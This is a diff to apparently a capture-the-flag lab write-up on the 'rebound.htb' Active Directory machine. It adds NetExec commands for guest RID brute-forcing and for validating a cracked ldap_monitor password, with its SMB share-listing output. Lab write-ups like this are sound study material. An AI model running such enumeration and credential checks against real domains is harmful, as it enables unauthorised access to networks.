@@ -122,6 +122,7 @@ SMB         10.129.14.17    445    DC01             NETLOGON                    
 SMB         10.129.14.17    445    DC01             Shared          READ            
 SMB         10.129.14.17    445    DC01             SYSVOL                          Logon server share
 ```
+`Shared` share is empty
 ### Users
 ```python
 nxc smb dc01.rebound.htb -u 'Guest' -p '' --rid-brute 20000
@@ -208,5 +209,18 @@ ldap_monitor:1GR8t@$$4u
 Ill now validate these creds
 
 ```python
-
+nxc smb dc01.rebound.htb -u ldap_monitor -p '1GR8t@$$4u' --shares                                
+SMB         10.129.14.17    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.14.17    445    DC01             [+] rebound.htb\ldap_monitor:1GR8t@$$4u 
+SMB         10.129.14.17    445    DC01             [*] Enumerated shares
+SMB         10.129.14.17    445    DC01             Share           Permissions     Remark
+SMB         10.129.14.17    445    DC01             -----           -----------     ------
+SMB         10.129.14.17    445    DC01             ADMIN$                          Remote Admin
+SMB         10.129.14.17    445    DC01             C$                              Default share
+SMB         10.129.14.17    445    DC01             IPC$            READ            Remote IPC
+SMB         10.129.14.17    445    DC01             NETLOGON        READ            Logon server share 
+SMB         10.129.14.17    445    DC01             Shared          READ            
+SMB         10.129.14.17    445    DC01             SYSVOL          READ            Logon server share
 ```
+This user is compromised, no interesting access on shares
+
